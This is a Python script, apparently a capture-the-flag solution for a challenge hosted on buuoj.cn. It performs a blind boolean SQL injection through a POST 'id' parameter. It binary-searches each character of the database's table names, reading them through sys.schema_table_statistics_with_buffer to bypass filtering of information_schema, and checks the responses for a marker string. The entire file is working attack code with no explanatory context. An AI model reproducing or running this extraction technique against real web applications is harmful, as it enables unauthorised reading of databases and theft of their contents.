import time
import requests
import sys
import string
import logging


# LOG_FORMAT = "%(lineno)d - %(asctime)s - %(levelname)s - %(message)s"
# logging.basicConfig(level=logging.DEBUG, format=LOG_FORMAT)
target="http://e24689e0-3c80-4eb0-91fa-297a44323160.node4.buuoj.cn/index.php"

dataStr="(select group_concat(table_name) from sys.schema_table_statistics_with_buffer where table_schema=database())"

def binaryTest(i,cu,comparer):
    s=requests.post(target,data={"id" : "0^(ascii(substr({},{},1)){comparer}{})".format(dataStr,i,cu,comparer=comparer)})
    if 'Nu1L' in s.text:
        return True
    else:
        return False


def searchFriends_sqli(i):
    l = 0
    r = 255
    while (l <= r):
        cu = (l + r) // 2
        if (binaryTest(i, cu, "<")):
            r = cu - 1
        elif (binaryTest(i, cu, ">")):
            l = cu + 1
        elif (cu == 0):
            return None
        else:
            return chr(cu)


def main():
    print("start")
    finres=""
    i=1
    while (True):
        extracted_char = searchFriends_sqli(i)
        if (extracted_char == None):
            break
        finres += extracted_char
        i += 1
        print("(+) 当前结果:"+finres)
    print("(+) 运行完成,结果为:", finres)

if __name__=="__main__":
    main()

